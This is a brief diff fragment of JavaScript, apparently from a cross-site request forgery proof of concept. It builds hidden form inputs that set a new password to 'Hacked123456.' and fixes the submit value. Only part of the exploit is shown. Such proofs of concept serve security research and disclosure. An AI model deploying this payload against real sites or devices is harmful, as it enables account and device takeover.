@@ -10,7 +10,7 @@ var fields={
   HDTN:'',
   new_passwd:'Hacked123456.',
   re_new_passwd:'Hacked123456.',
-  cpasswd:'Change+Password'
+  cpasswd:'Change Password'
 };
 for(var k in fields){
   var i=document.createElement('input');
